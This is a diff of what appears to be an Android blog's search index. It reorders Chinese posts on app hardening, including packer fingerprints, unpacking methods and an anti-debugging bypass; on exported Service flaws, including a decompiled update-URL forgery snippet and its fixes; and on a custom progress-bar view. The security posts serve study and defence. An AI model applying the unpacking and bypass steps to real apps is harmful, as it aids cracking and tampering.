@@ -3330,6 +3330,158 @@ public ParcelFileDescriptor openFile(Uri paramUri,String paramString) throws Fil
       </tags>
   </entry>
   <entry>
+    <title>android加固</title>
+    <url>/post/3671652172.html</url>
+    <content><![CDATA[<h2 id="app加固威胁"><a href="#app加固威胁" class="headerlink" title="app加固威胁"></a>app加固威胁</h2><ul>
+<li>代码修改(广告植入、替换广告id)</li>
+<li>资源修改(界面替换广告，链接替换)</li>
+<li>破解(应用收费，内购)</li>
+<li>篡改数据(无限金币,钻石)</li>
+<li>加入恶意代码(木马，隐私，交易)</li>
+<li>动态注入，数据拦截，窃取，修改；协议修改</li>
+</ul>
+<h2 id="app加固的目的"><a href="#app加固的目的" class="headerlink" title="app加固的目的"></a>app加固的目的</h2><ul>
+<li>保护核心代码，防止被逆向，泄密 防止逆向分析-防止核心代码被反编译</li>
+<li>防止营销作弊</li>
+<li>防止代码被修改</li>
+<li>控制被二次打包-校验完整性，签名，防止盗版</li>
+<li>防止调试和注入-防止动态调试，注入获取关键数据</li>
+<li>防止应用数据窃取-加密敏感数据</li>
+<li>防止协议直接被盗刷-加密协议通信</li>
+</ul>
+<h2 id="加固技术的发展历史"><a href="#加固技术的发展历史" class="headerlink" title="加固技术的发展历史"></a>加固技术的发展历史</h2><ul>
+<li>第一代 DEX加密、字符串加密、资源加密、反调试、自定义DexClassLoader </li>
+<li>第二代 核心封装到So库/方法抽取/反调试</li>
+<li>第三代 ELF变形/Ollvm混淆/多进程保护</li>
+<li>第四代 代码虚拟化保护 DEX虚拟化保护</li>
+<li>第五代 ARM虚拟化保护</li>
+</ul>
+<h2 id="常见加固厂商"><a href="#常见加固厂商" class="headerlink" title="常见加固厂商"></a>常见加固厂商</h2><ul>
+<li>加固保360</li>
+</ul>
+<p><a href="http://jiagu.360.cn/#/global/index" target="_blank" rel="noopener">360加固保</a></p>
+<ul>
+<li>娜迦nagapt</li>
+</ul>
+<p><a href="http://www.nagain.com/" target="_blank" rel="noopener">娜迦加固</a>  </p>
+<ul>
+<li>梆梆bangcle</li>
+</ul>
+<p><a href="https://www.bangcle.com/" target="_blank" rel="noopener">梆梆加固</a></p>
+<ul>
+<li>爱加密ijm</li>
+</ul>
+<p><a href="http://www.ijiami.cn/appprotect_encrypt_way" target="_blank" rel="noopener">爱加密加固</a></p>
+<ul>
+<li>阿里</li>
+<li>百度，盛大，腾讯，网秦，通付盾</li>
+</ul>
+<h2 id="常见加固方式"><a href="#常见加固方式" class="headerlink" title="常见加固方式"></a>常见加固方式</h2><p>类加载技术：<br>针对apk中的classes.dex文件进行处理，放入待定的文件中，通过native代码来进行对其运行时解密。  </p>
+<p>使用厂商：娜迦，爱加密，梆梆等。  </p>
+<p>方法替换技术：<br>将classes.dex中的方法中代码进行提取，抽取方法，在运行时对其动态进行解密还原  </p>
+<p>梆梆，娜迦  </p>
+<h2 id="常用加固厂商特征"><a href="#常用加固厂商特征" class="headerlink" title="常用加固厂商特征"></a>常用加固厂商特征</h2><ul>
+<li>娜迦 libchaosvmp.so,libddog.so libfdog.so</li>
+<li>爱加密 libexec.so,libexecmain.so</li>
+<li>梆梆 libsecexe.so libsecmain.so libDexHelper.so</li>
+<li>360 libprotectClass.so libjiagu.so</li>
+<li>通付盾 libegis.so</li>
+<li>网秦 libnqshield.so</li>
+<li>百度 libbaiduprotect.so</li>
+</ul>
+<h2 id="脱壳的手法"><a href="#脱壳的手法" class="headerlink" title="脱壳的手法"></a>脱壳的手法</h2><ul>
+<li>修改系统源码自动脱壳</li>
+<li>通过hook方式对关键函数进行脱壳</li>
+<li>开源工具入ZjDroid，DexHunter进行脱壳</li>
+<li>利用IDA或者GDB动态调试进行脱壳</li>
+</ul>
+<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>反调试代码，都是在壳子的so中执行的，那么，我们只要在进入壳子第一行代码时下了断点，在调试过程中，找到了反调试检测代码的位置，直接干掉，直接绕过反调试  </p>
+<p>在libdvm.so中方法loadNativeCode处下断点，android系统加载加载native代码也就是so文件都要走的函数，所以下在这里的断点，能够有效的找到加载壳子的so位置，能够在一进入壳子的so，直接断住。  </p>
+<p>最简单的技巧，就是单步调试，F8一路按下去，按的多了，就有了更好的位置下断点。  </p>
+<p>记住一点就好，壳子的so中，总有一处是解密还原出app原本的dex的。  </p>
+]]></content>
+      <categories>
+        <category>android安全</category>
+      </categories>
+      <tags>
+        <tag>android安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android Service漏洞挖掘</title>
+    <url>/post/3182197634.html</url>
+    <content><![CDATA[<h2 id="Service安全场景和危害"><a href="#Service安全场景和危害" class="headerlink" title="Service安全场景和危害"></a>Service安全场景和危害</h2><pre><code>Service是android四大组件之一，一个Service是没有界面且能长时间运行于后台的应用组件。其他应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行。另外，一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。例如，一个service可能处理网络事物，播放音乐，执行文件I/O，或与一个内容提供者交互，所有这些都在后台进行。Service不是分离开的进程，除非其他特殊情况，他不会运行在自己的进程，而是作为启动运行它的进程的一部分。Service不是线程，这意味着它将在主线程里劳作。  
+
+如果一个导出的Service没有做严格的限制，任何应用可以去启动并且绑定到这个Service上，取决于被暴露的功能，这有可能使得一个应用去执行未授权的行为，获取敏感信息或者是污染修改内部应用的状态造成威胁。  
+</code></pre><h2 id="Service漏洞分类"><a href="#Service漏洞分类" class="headerlink" title="Service漏洞分类"></a>Service漏洞分类</h2><ul>
+<li>权限提升</li>
+<li>services劫持</li>
+<li>消息伪造</li>
+<li>拒绝服务</li>
+</ul>
+<h2 id="权限提升漏洞"><a href="#权限提升漏洞" class="headerlink" title="权限提升漏洞"></a>权限提升漏洞</h2><pre><code>当一个service配置了intent-filter默认是被导出的，如果没对调用这个Service进行权限限制或者是没有对调用者的身份进行有效的验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意的行为发生比如说调用具有system权限的删除卸载服务删除卸载其他应用。
+</code></pre><h2 id="service劫持"><a href="#service劫持" class="headerlink" title="service劫持"></a>service劫持</h2><pre><code>攻击原理：隐式启动service，当存在同名service，先安装应用的service优先级高。  
+</code></pre><h2 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>暴露的Service对外接收Intent，如果构造恶意的消息放到Intent中传输，被调用的Service接收有可能产生安全隐患。  
+
+如：指定升级下载的URL地址，可导致任意应用安装！  
+</code></pre><h2 id="消息伪造-1"><a href="#消息伪造-1" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>protected void onHandleIntent(Intent intent){
+    Intent v0;
+    String v23;
+    Serializable pushMsg=intent.getSerializableExtra(&quot;PushMsg&quot;);
+    ...
+    AppVersionManager.getInstance(Youku.context).showAPpAgreementDialog();
+
+    switch(pushMsg.type){
+        case 1:{
+            goto label_53;
+
+        }
+    }
+}
+
+label_53:
+    intent.setFlags(876609536);
+    intent.setClass(this,UpdateActivity.class);
+    intent.putExtra(&quot;updateurl&quot;,pushMsg.updateurl);
+    intent.putExtra(&quot;updateversion&quot;,pushMsg.updateversion);
+    intent.putExtra(&quot;updatecontent&quot;,pushMsg.updatecontent);
+    intent.putExtra(&quot;updateType&quot;,2);
+    this.startActivity(intent);
+    return;
+</code></pre><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><pre><code>Service的拒绝服务主要是来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致的程序崩溃。主要体现的方面如给Service传输未null的intent或者是传输序列化对象导致接收时候的类型转化异常。  
+</code></pre><p>修复：<br>1.改成service exported false<br>2.删除多余测试代码，验证token</p>
+<h2 id="拒绝服务：防护"><a href="#拒绝服务：防护" class="headerlink" title="拒绝服务：防护"></a>拒绝服务：防护</h2><ul>
+<li>空指针异常</li>
+<li>类型转换异常</li>
+<li>数组越界访问异常</li>
+<li>类未定义异常</li>
+<li><p>其他异常</p>
+<p>  //Serializable:<br>  Intent i = this.getIntent();<br>  if(i.getAction().equals(“serializable_action”)){<br>  i.getSerializableExtra(“serializable_key”);//未做异常判断<br>  }<br>  //Parcelable:<br>  this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃</p>
+<p>  谨慎处理接收的intent以及其携带的信息。<br>  对接收到的任何数据try catch处理，以及对不符合预期的数据做异常处理。  </p>
+</li>
+</ul>
+<h2 id="Service安全防护"><a href="#Service安全防护" class="headerlink" title="Service安全防护"></a>Service安全防护</h2><ul>
+<li>私有service不定义intent-filter并且设置exported为false。</li>
+<li>公开的service设置exported为true，intent-filter可以定义或者不定义。</li>
+<li>合作service需对合作方的app签名做校验。</li>
+<li>只被应用本身使用的service应设置为私有。</li>
+<li>service接收到的数据需谨慎处理。</li>
+<li>内部service需使用签名级别的protectionLevel来判断是否为内部应用调用。</li>
+<li>不应在service创建(onCreate方法被调用)的时候决定是否提供服务,应在onStartCommand/onBind/onHandleIntent等方法被调用的时候做判断。</li>
+<li>当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险。</li>
+<li>有明确的服务需调用时使用显示意图。</li>
+<li>尽量不发送敏感信息。</li>
+<li>启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>android安全</category>
+      </categories>
+      <tags>
+        <tag>anroid安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>android Activity漏洞挖掘</title>
     <url>/post/2470166639.html</url>
     <content><![CDATA[<h2 id="越权绕过漏洞"><a href="#越权绕过漏洞" class="headerlink" title="越权绕过漏洞"></a>越权绕过漏洞</h2><p>在Android系统中，Activity默认是不导出的，如果设置了 <code>exported=&quot;true&quot;</code> 这样的关键值或者是添加了<code>&lt;intent-filter&gt;</code>这样的属性，并且没有显示的设置为<code>exported=&quot;false&quot;</code>,那么此时Activity是导出的，如果Activity被不合理的导出，那么就会有越权绕过或者是泄漏敏感信息等安全风险，比如在业务过程中会有一些敏感的界面是需要用户输入密码才能查看的，但是如果没有对调起此activity的组件进行权限验证，那么就会造成验证的越权问题，导致恶意的攻击者不需要输入密码等信息也可以打开这个界面。还有通过Intent给Activity传输畸形数据使得程序崩溃拒绝服务影响用户体验或Activity界面被劫持产生欺诈等安全事件。  </p>
@@ -3413,158 +3565,6 @@ this.b=(RouterConfig)this.getIntent().getParcelableExtra(&quot;filed_router_conf
 谨慎处理接收的intent以及其携带的信息。  
 对接收到的任何数据做try catch处理，以及对不符合预期的数据做异常处理。  
 </code></pre>]]></content>
-      <categories>
-        <category>android安全</category>
-      </categories>
-      <tags>
-        <tag>android安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android Service漏洞挖掘</title>
-    <url>/post/3182197634.html</url>
-    <content><![CDATA[<h2 id="Service安全场景和危害"><a href="#Service安全场景和危害" class="headerlink" title="Service安全场景和危害"></a>Service安全场景和危害</h2><pre><code>Service是android四大组件之一，一个Service是没有界面且能长时间运行于后台的应用组件。其他应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行。另外，一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。例如，一个service可能处理网络事物，播放音乐，执行文件I/O，或与一个内容提供者交互，所有这些都在后台进行。Service不是分离开的进程，除非其他特殊情况，他不会运行在自己的进程，而是作为启动运行它的进程的一部分。Service不是线程，这意味着它将在主线程里劳作。  
-
-如果一个导出的Service没有做严格的限制，任何应用可以去启动并且绑定到这个Service上，取决于被暴露的功能，这有可能使得一个应用去执行未授权的行为，获取敏感信息或者是污染修改内部应用的状态造成威胁。  
-</code></pre><h2 id="Service漏洞分类"><a href="#Service漏洞分类" class="headerlink" title="Service漏洞分类"></a>Service漏洞分类</h2><ul>
-<li>权限提升</li>
-<li>services劫持</li>
-<li>消息伪造</li>
-<li>拒绝服务</li>
-</ul>
-<h2 id="权限提升漏洞"><a href="#权限提升漏洞" class="headerlink" title="权限提升漏洞"></a>权限提升漏洞</h2><pre><code>当一个service配置了intent-filter默认是被导出的，如果没对调用这个Service进行权限限制或者是没有对调用者的身份进行有效的验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意的行为发生比如说调用具有system权限的删除卸载服务删除卸载其他应用。
-</code></pre><h2 id="service劫持"><a href="#service劫持" class="headerlink" title="service劫持"></a>service劫持</h2><pre><code>攻击原理：隐式启动service，当存在同名service，先安装应用的service优先级高。  
-</code></pre><h2 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>暴露的Service对外接收Intent，如果构造恶意的消息放到Intent中传输，被调用的Service接收有可能产生安全隐患。  
-
-如：指定升级下载的URL地址，可导致任意应用安装！  
-</code></pre><h2 id="消息伪造-1"><a href="#消息伪造-1" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>protected void onHandleIntent(Intent intent){
-    Intent v0;
-    String v23;
-    Serializable pushMsg=intent.getSerializableExtra(&quot;PushMsg&quot;);
-    ...
-    AppVersionManager.getInstance(Youku.context).showAPpAgreementDialog();
-
-    switch(pushMsg.type){
-        case 1:{
-            goto label_53;
-
-        }
-    }
-}
-
-label_53:
-    intent.setFlags(876609536);
-    intent.setClass(this,UpdateActivity.class);
-    intent.putExtra(&quot;updateurl&quot;,pushMsg.updateurl);
-    intent.putExtra(&quot;updateversion&quot;,pushMsg.updateversion);
-    intent.putExtra(&quot;updatecontent&quot;,pushMsg.updatecontent);
-    intent.putExtra(&quot;updateType&quot;,2);
-    this.startActivity(intent);
-    return;
-</code></pre><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><pre><code>Service的拒绝服务主要是来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致的程序崩溃。主要体现的方面如给Service传输未null的intent或者是传输序列化对象导致接收时候的类型转化异常。  
-</code></pre><p>修复：<br>1.改成service exported false<br>2.删除多余测试代码，验证token</p>
-<h2 id="拒绝服务：防护"><a href="#拒绝服务：防护" class="headerlink" title="拒绝服务：防护"></a>拒绝服务：防护</h2><ul>
-<li>空指针异常</li>
-<li>类型转换异常</li>
-<li>数组越界访问异常</li>
-<li>类未定义异常</li>
-<li><p>其他异常</p>
-<p>  //Serializable:<br>  Intent i = this.getIntent();<br>  if(i.getAction().equals(“serializable_action”)){<br>  i.getSerializableExtra(“serializable_key”);//未做异常判断<br>  }<br>  //Parcelable:<br>  this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃</p>
-<p>  谨慎处理接收的intent以及其携带的信息。<br>  对接收到的任何数据try catch处理，以及对不符合预期的数据做异常处理。  </p>
-</li>
-</ul>
-<h2 id="Service安全防护"><a href="#Service安全防护" class="headerlink" title="Service安全防护"></a>Service安全防护</h2><ul>
-<li>私有service不定义intent-filter并且设置exported为false。</li>
-<li>公开的service设置exported为true，intent-filter可以定义或者不定义。</li>
-<li>合作service需对合作方的app签名做校验。</li>
-<li>只被应用本身使用的service应设置为私有。</li>
-<li>service接收到的数据需谨慎处理。</li>
-<li>内部service需使用签名级别的protectionLevel来判断是否为内部应用调用。</li>
-<li>不应在service创建(onCreate方法被调用)的时候决定是否提供服务,应在onStartCommand/onBind/onHandleIntent等方法被调用的时候做判断。</li>
-<li>当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险。</li>
-<li>有明确的服务需调用时使用显示意图。</li>
-<li>尽量不发送敏感信息。</li>
-<li>启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>android安全</category>
-      </categories>
-      <tags>
-        <tag>anroid安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android加固</title>
-    <url>/post/3671652172.html</url>
-    <content><![CDATA[<h2 id="app加固威胁"><a href="#app加固威胁" class="headerlink" title="app加固威胁"></a>app加固威胁</h2><ul>
-<li>代码修改(广告植入、替换广告id)</li>
-<li>资源修改(界面替换广告，链接替换)</li>
-<li>破解(应用收费，内购)</li>
-<li>篡改数据(无限金币,钻石)</li>
-<li>加入恶意代码(木马，隐私，交易)</li>
-<li>动态注入，数据拦截，窃取，修改；协议修改</li>
-</ul>
-<h2 id="app加固的目的"><a href="#app加固的目的" class="headerlink" title="app加固的目的"></a>app加固的目的</h2><ul>
-<li>保护核心代码，防止被逆向，泄密 防止逆向分析-防止核心代码被反编译</li>
-<li>防止营销作弊</li>
-<li>防止代码被修改</li>
-<li>控制被二次打包-校验完整性，签名，防止盗版</li>
-<li>防止调试和注入-防止动态调试，注入获取关键数据</li>
-<li>防止应用数据窃取-加密敏感数据</li>
-<li>防止协议直接被盗刷-加密协议通信</li>
-</ul>
-<h2 id="加固技术的发展历史"><a href="#加固技术的发展历史" class="headerlink" title="加固技术的发展历史"></a>加固技术的发展历史</h2><ul>
-<li>第一代 DEX加密、字符串加密、资源加密、反调试、自定义DexClassLoader </li>
-<li>第二代 核心封装到So库/方法抽取/反调试</li>
-<li>第三代 ELF变形/Ollvm混淆/多进程保护</li>
-<li>第四代 代码虚拟化保护 DEX虚拟化保护</li>
-<li>第五代 ARM虚拟化保护</li>
-</ul>
-<h2 id="常见加固厂商"><a href="#常见加固厂商" class="headerlink" title="常见加固厂商"></a>常见加固厂商</h2><ul>
-<li>加固保360</li>
-</ul>
-<p><a href="http://jiagu.360.cn/#/global/index" target="_blank" rel="noopener">360加固保</a></p>
-<ul>
-<li>娜迦nagapt</li>
-</ul>
-<p><a href="http://www.nagain.com/" target="_blank" rel="noopener">娜迦加固</a>  </p>
-<ul>
-<li>梆梆bangcle</li>
-</ul>
-<p><a href="https://www.bangcle.com/" target="_blank" rel="noopener">梆梆加固</a></p>
-<ul>
-<li>爱加密ijm</li>
-</ul>
-<p><a href="http://www.ijiami.cn/appprotect_encrypt_way" target="_blank" rel="noopener">爱加密加固</a></p>
-<ul>
-<li>阿里</li>
-<li>百度，盛大，腾讯，网秦，通付盾</li>
-</ul>
-<h2 id="常见加固方式"><a href="#常见加固方式" class="headerlink" title="常见加固方式"></a>常见加固方式</h2><p>类加载技术：<br>针对apk中的classes.dex文件进行处理，放入待定的文件中，通过native代码来进行对其运行时解密。  </p>
-<p>使用厂商：娜迦，爱加密，梆梆等。  </p>
-<p>方法替换技术：<br>将classes.dex中的方法中代码进行提取，抽取方法，在运行时对其动态进行解密还原  </p>
-<p>梆梆，娜迦  </p>
-<h2 id="常用加固厂商特征"><a href="#常用加固厂商特征" class="headerlink" title="常用加固厂商特征"></a>常用加固厂商特征</h2><ul>
-<li>娜迦 libchaosvmp.so,libddog.so libfdog.so</li>
-<li>爱加密 libexec.so,libexecmain.so</li>
-<li>梆梆 libsecexe.so libsecmain.so libDexHelper.so</li>
-<li>360 libprotectClass.so libjiagu.so</li>
-<li>通付盾 libegis.so</li>
-<li>网秦 libnqshield.so</li>
-<li>百度 libbaiduprotect.so</li>
-</ul>
-<h2 id="脱壳的手法"><a href="#脱壳的手法" class="headerlink" title="脱壳的手法"></a>脱壳的手法</h2><ul>
-<li>修改系统源码自动脱壳</li>
-<li>通过hook方式对关键函数进行脱壳</li>
-<li>开源工具入ZjDroid，DexHunter进行脱壳</li>
-<li>利用IDA或者GDB动态调试进行脱壳</li>
-</ul>
-<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>反调试代码，都是在壳子的so中执行的，那么，我们只要在进入壳子第一行代码时下了断点，在调试过程中，找到了反调试检测代码的位置，直接干掉，直接绕过反调试  </p>
-<p>在libdvm.so中方法loadNativeCode处下断点，android系统加载加载native代码也就是so文件都要走的函数，所以下在这里的断点，能够有效的找到加载壳子的so位置，能够在一进入壳子的so，直接断住。  </p>
-<p>最简单的技巧，就是单步调试，F8一路按下去，按的多了，就有了更好的位置下断点。  </p>
-<p>记住一点就好，壳子的so中，总有一处是解密还原出app原本的dex的。  </p>
-]]></content>
       <categories>
         <category>android安全</category>
       </categories>
@@ -5705,200 +5705,6 @@ String textSource = &quot;江苏苏宁VS上海上港-&lt;font color=&#39;#FF6059
       </tags>
   </entry>
   <entry>
-    <title>android自定义view圆形进度条</title>
-    <url>/post/2381054113.html</url>
-    <content><![CDATA[<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/24/03.jpg" alt="效果图"></p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>attrs.xml  </p>
-<pre><code>&lt;declare-styleable name=&quot;RingProgressBarView&quot;&gt;
-    &lt;attr name=&quot;circle_radius&quot; format=&quot;dimension&quot;/&gt;
-    &lt;attr name=&quot;stroke_width&quot; format=&quot;dimension&quot;/&gt;
-    &lt;attr name=&quot;circle_color&quot; format=&quot;color&quot;/&gt;
-    &lt;attr name=&quot;ring_background_color&quot; format=&quot;color&quot;/&gt;
-    &lt;attr name=&quot;ring_cor&quot; forLineProgressBarViewmat=&quot;color&quot;/&gt;
-    &lt;attr name=&quot;font_color&quot; format=&quot;color&quot;/&gt;
-    &lt;attr name=&quot;font_size&quot; format=&quot;dimension&quot;/&gt;
-&lt;/declare-styleable&gt;
-</code></pre><p>RingProgressBarView.java  </p>
-<pre><code>public class RingProgressBarView extends View {
-
-    // 画实心圆的画笔
-    private Paint mCirclePaint;
-    // 画圆环的画笔
-    private Paint mRingPaint;
-    // 画圆环的画笔背景色
-    private Paint mRingPaintBg;
-    // 画字体的画笔
-    private Paint mTextPaint;
-    // 圆形颜色
-    private int mCircleColor;
-    // 圆环颜色
-    private int mRingColor;
-    // 圆环背景颜色
-    private int mRingBgColor;
-    // 字体颜色
-    private int mTextColor;
-    // 字体大小
-    private float mTextSize;
-    // 半径
-    private float mRadius;
-    // 圆环半径
-    private float mRingRadius;
-    // 圆环宽度
-    private float mStrokeWidth;
-    // 圆心x坐标
-    private int mXCenter;
-    // 圆心y坐标
-    private int mYCenter;
-    // 字的长度
-    private float mTxtWidth;
-    // 字的高度
-    private float mTxtHeight;
-    // 总进度
-    private int mTotalProgress = 100;
-    // 当前进度
-    private float mProgress;
-
-    private String mProgressTxt;
-
-    public RingProgressBarView(Context context, @Nullable AttributeSet attrs) {
-        super(context, attrs);
-        initAttrs(context, attrs);
-        initVariable();
-    }
-
-    private void initAttrs(Context context,AttributeSet attrs) {
-        TypedArray typeArray = context.getTheme().obtainStyledAttributes(attrs,
-                R.styleable.RingProgressBarView, 0, 0);
-        mRadius = typeArray.getDimension(R.styleable.RingProgressBarView_circle_radius, dp2px(30));
-        mStrokeWidth = typeArray.getDimension(R.styleable.RingProgressBarView_stroke_width,dp2px(6));
-        mCircleColor = typeArray.getColor(R.styleable.RingProgressBarView_circle_color, Color.parseColor(&quot;#ffffff&quot;));
-        mRingColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_cor, Color.parseColor(&quot;#FF6059&quot;));
-        mRingBgColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_background_color,Color.parseColor(&quot;#E3E2E2&quot;));
-        mTextColor = typeArray.getColor(R.styleable.RingProgressBarView_font_color,Color.parseColor(&quot;#2E3D45&quot;));
-        mTextSize = typeArray.getDimension(R.styleable.RingProgressBarView_font_size,mRadius / 3);
-        mRingRadius = mRadius + mStrokeWidth / 2;
-    }
-
-    private void initVariable() {
-        //内圆
-        mCirclePaint = getPaint(Paint.Style.FILL,mCircleColor);
-
-
-        //外圆弧背景
-        mRingPaintBg = getPaint(Paint.Style.STROKE,mRingBgColor,mStrokeWidth);
-
-        //外圆弧
-        mRingPaint = getPaint(Paint.Style.STROKE,mRingColor,mStrokeWidth);
-        mRingPaint.setStrokeCap(Paint.Cap.ROUND);//设置线冒样式，有圆 有方
-
-        //中间字
-        mTextPaint = getPaint(Paint.Style.FILL,mTextColor);
-        mTextPaint.setTextSize(mTextSize);
-
-        Paint.FontMetrics fm = mTextPaint.getFontMetrics();
-        mTxtHeight = (int) Math.ceil(fm.descent - fm.ascent);
-    }
-
-    private Paint getPaint(Paint.Style style,int color){
-        Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG); //抗锯齿标志
-        paint.setStyle(style);
-        paint.setColor(color);
-        paint.setAntiAlias(true);
-        return paint;
-    }
-    private Paint getPaint(Paint.Style style,int color,float width){
-        Paint paint = getPaint(style,color);
-        paint.setStrokeWidth(width);
-        return paint;
-    }
-
-    @Override
-    protected void onDraw(Canvas canvas) {
-//        super.onDraw(canvas);
-        mXCenter = getWidth() / 2;
-        mYCenter = getHeight() / 2;
-
-        //内圆
-        canvas.drawCircle(mXCenter, mYCenter, mRadius, mCirclePaint);
-
-        //外圆弧背景
-        RectF oval1 = new RectF();
-        oval1.left = (mXCenter - mRingRadius);
-        oval1.top = (mYCenter - mRingRadius);
-        oval1.right = mRingRadius * 2 + (mXCenter - mRingRadius);
-        oval1.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);
-        canvas.drawArc(oval1, 0, 360, false, mRingPaintBg); //圆弧所在的椭圆对象、圆弧的起始角度、圆弧的角度、是否显示半径连线
-
-        //外圆弧
-        if (mProgress &gt; 0 ) {
-            RectF oval = new RectF();
-            oval.left = (mXCenter - mRingRadius);
-            oval.top = (mYCenter - mRingRadius);
-            oval.right = mRingRadius * 2 + (mXCenter - mRingRadius);
-            oval.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);
-            canvas.drawArc(oval, -90, -(((float)mProgress / mTotalProgress) * 360), false, mRingPaint); //
-
-            //字体
-            String txt = mProgressTxt + &quot;%&quot;;
-            mTxtWidth = mTextPaint.measureText(txt, 0, txt.length());
-            canvas.drawText(txt, mXCenter - mTxtWidth / 2, mYCenter + mTxtHeight / 4, mTextPaint);
-        }
-    }
-
-    //设置进度
-    public void setProgress(float progress) {
-        final ValueAnimator anim = ValueAnimator.ofFloat(0,progress);
-        anim.setDuration(3000);
-        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
-            @Override
-            public void onAnimationUpdate(ValueAnimator animator) {
-                mProgress  = (float)animator.getAnimatedValue();
-                DecimalFormat df2 = new DecimalFormat(&quot;###.00&quot;);
-                mProgressTxt= df2.format(mProgress);
-                invalidate();
-            }
-        });
-        anim.start();
-    }
-    protected int dp2px(int dpVal) {
-        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,dpVal,getResources().getDisplayMetrics());
-    }
-}
-</code></pre><p>activity_ring_progress_bar.xml  </p>
-<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
-                                             xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
-                                             android:layout_width=&quot;match_parent&quot;
-                                             android:layout_height=&quot;match_parent&quot;&gt;
-
-    &lt;com.demo.android_view.mview.RingProgressBarView
-            android:id=&quot;@+id/rpbv&quot;
-            android:layout_width=&quot;120dp&quot;
-            android:layout_height=&quot;120dp&quot;/&gt;
-&lt;/android.support.constraint.ConstraintLayout&gt;
-</code></pre><p>RingProgressBarActivity.java  </p>
-<pre><code>public class RingProgressBarActivity extends AppCompatActivity {
-
-    private RingProgressBarView rpbv;
-
-    @Override
-    protected void onCreate(@Nullable Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_ring_progress_bar);
-        rpbv = findViewById(R.id.rpbv);
-        rpbv.setProgress(100f);
-    }
-}
-</code></pre><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><a href="https://github.com/tea9/android_view" target="_blank" rel="noopener">源代码</a>  </p>
-<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_32519693/article/details/76726525" target="_blank" rel="noopener">Android 自定义漂亮的圆形进度条</a><br><a href="https://blog.csdn.net/zhangqunshuai/article/details/80760277" target="_blank" rel="noopener">Android自定义View之画圆环(进阶篇:圆形进度条)</a><br><a href="https://blog.csdn.net/mengks1987/article/details/77771465" target="_blank" rel="noopener">Android 自定义View实例之进度圆环</a><br><a href="https://blog.csdn.net/ahuyangdong/article/details/79942824" target="_blank" rel="noopener">Android花样loading进度条（二）-简单环形进度条</a><br><a href="https://www.jianshu.com/p/fd5616685d3d" target="_blank" rel="noopener">Android自定义圆形进度条</a><br><a href="https://blog.csdn.net/anonymousprogrammer/article/details/65634886" target="_blank" rel="noopener">android自定义控件之圆形进度条（带动画）</a>  </p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>android自定义View线进度条</title>
     <url>/post/3456428152.html</url>
     <content><![CDATA[<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/24/01.jpg" alt="效果图"></p>
@@ -6232,6 +6038,200 @@ canvas.drawLine(length_b, height / 2, length_b+2, height / 2, num_b_paint);
 }
 </code></pre><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><a href="https://github.com/tea9/android_view" target="_blank" rel="noopener">源代码</a>  </p>
